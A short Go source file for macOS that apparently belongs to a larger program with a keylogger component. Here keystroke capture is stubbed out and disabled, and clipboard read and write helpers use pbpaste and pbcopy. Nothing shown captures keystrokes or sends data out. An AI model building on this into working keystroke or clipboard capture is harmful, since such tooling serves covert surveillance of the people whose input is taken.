//go:build darwin

package main

import "os/exec"

func (k *keyLogger) capture() {
	// macOS keylogger not implemented — disable gracefully
	k.mu.Lock()
	k.active = false
	k.mu.Unlock()
}

func clipboardGet() (string, int) {
	out, err := runCmd("pbpaste")
	if err != nil {
		return "error: " + err.Error(), 1
	}
	return out, 0
}

func clipboardSet(text string) (string, int) {
	cmd := exec.Command("pbcopy")
	in, err := cmd.StdinPipe()
	if err != nil {
		return "error: pbcopy failed", 1
	}
	if err := cmd.Start(); err != nil {
		return "error: pbcopy failed", 1
	}
	_, _ = in.Write([]byte(text))
	_ = in.Close()
	if cmd.Wait() != nil {
		return "error: pbcopy failed", 1
	}
	return "clipboard set", 0
}
